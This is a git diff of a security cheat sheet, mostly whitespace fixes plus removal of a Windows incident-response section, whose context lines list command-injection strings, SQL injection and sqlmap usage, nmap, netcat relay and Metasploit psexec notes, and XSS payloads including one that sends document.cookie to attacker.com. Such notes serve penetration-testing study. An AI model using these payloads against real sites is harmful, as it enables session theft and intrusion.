@@ -39,7 +39,7 @@
 
 ## Command Injection Patterns
 	```
-    -h
+    	-h
 	; echo Injected
 	| echo Injected
 	|| echo Injected
@@ -48,7 +48,7 @@
 	$(echo Injected)
 	`echo Injected
 	>(echo Injected)
-   ```
+   	```
 
 ## XSS paste this simbols into parameters and check source code to see if they get printed back verbatim
 	```
@@ -57,7 +57,7 @@
 	<script<alert('xss');</script>
 	src=javascript:alert('XSS');
 	<script>document.location='http://attacker.com/save.php?c='+document.cookie</script>
-    ```
+   	```
 
 
 ## SQL Injection
@@ -65,7 +65,7 @@
     ='or'='
 	SQL command delimiter --
 	SQL query terminator ;
-    ```
+    	```
 
 ## SQL map:
 	```
@@ -73,7 +73,7 @@
 	sqlmap -u "http://domain/page/script.php?c=1&name=john&last=snow......" 
 	--dbs first to list databases
 	-D <database name> --tables   (to get table names)
-    ```
+    	```
 	
 	
 ## BPF (berkley packet filter)
@@ -83,13 +83,13 @@
 	proto: ip, tcp, udp, icmp, etc
 	operators: and &&, or ||, not !
 	use parenthesis to group as needed
-    ```
+  	```
 	
 ## tcpdump (pcapng supports comments):
 	```
     uses BPFs
 	tcpdump -r <file.pcap> 'src host <ip>'
-    ```
+    	```
 	
 ## NMAP  
 	```
@@ -102,14 +102,14 @@
 	--reason to show why it was determined up/down open/closed
 	-p- (all) ports -p 0-1024  (range) -p 1,2,3  (list)
 	-sV for version will do more tests to get what service name. server, etc is running. (includded in -A command)
-    ```
+    	```
 
 ## netcat (print cheat )
 	```
     -reminder you can't listen for connections for a particular IP only of a particular port e.g., nc -l -p 3333
 	relay: makefifo namedpipe; nc -l -p 8888 < namedpipe | nc <dest ip> <dest port> > namedpipe
 	get banner or other data from an open port:   nc <ip> <port> > output.txt
-    ```
+    	```
 
 ## Metasploit
 	```
@@ -118,7 +118,7 @@
 		I think:
 			windows/smp/psexec
 			windows/meterpreter/psexec
-    ```
+    	```
 
 ## volatility
 	```
@@ -126,7 +126,7 @@
 	use 
 	export VOLATILITY_LOCATION="file:///home/...././/file.mem"
 	export VOLATILITY_PROFILE="Win..."
-    ```
+    	```
 
 ## Hashcat 
 - -m (hash type). [## linux password format] Full list here https://hashcat.net/wiki/doku.php?id=example_hashes
@@ -290,21 +290,3 @@ https://ss64.com/nt/net.html
 - callback frequency (including skew .e.g, +-1min) > potencial beaconing
 - You can add FP suppressions in the config.yaml file
 	
-
-
-
-## Procedures
-### DFIR
-#### look at services:
-- `services.msc`
-- `net start (get running services)`
-- `sc query | more or sc query <servic name>`
-- `tasklist /svc`
-- WMI `get-wmiobject -query "select * from win32_service`
-    `svc_name = "<svc_name>"; $service = get-wmiobject -query "select * from win32_service where name='$svc_name'"; echo $service | fl * > c:\temp\service-wmi-details-$svc_name.txt`
-- Powershell `get-service`
-
-#### find newly created accounts with admni rights (persistence)
-- list admins `net localgroup administrators`
-- find most recent created account in event logs `Get-WinEvent Security | Where-object Id -eq '4720' | fl TimeCreated, Message`
-
